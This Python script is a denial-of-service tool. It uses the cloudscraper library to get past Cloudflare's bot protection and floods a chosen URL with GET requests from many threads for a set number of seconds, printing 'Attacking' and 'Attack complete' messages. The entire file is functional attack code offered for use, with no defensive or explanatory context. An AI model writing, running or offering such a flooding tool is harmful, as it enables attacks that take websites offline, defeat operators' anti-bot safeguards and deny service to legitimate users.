import threading, cloudscraper, datetime, time, sys
from colorama import Fore, init
init(convert=True)

def LaunchCFB(url, threadss, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threadss):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except:
            pass

if __name__ == '__main__':
    if len(sys.argv) == 4:
        # Command-line arguments provided
        target = sys.argv[1]
        thread = sys.argv[2]
        t = sys.argv[3]
    else:
        # Interactive input (original behavior)
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
        target = input()
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
        thread = input()
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
        t = input()
    
    print(Fore.MAGENTA+" [>] "+Fore.WHITE+"Attacking => "+target+" for "+t+" seconds")
    LaunchCFB(target, thread, t)
    time.sleep(int(t))
    print(Fore.MAGENTA+"\n [>] "+Fore.WHITE+"Attack complete.")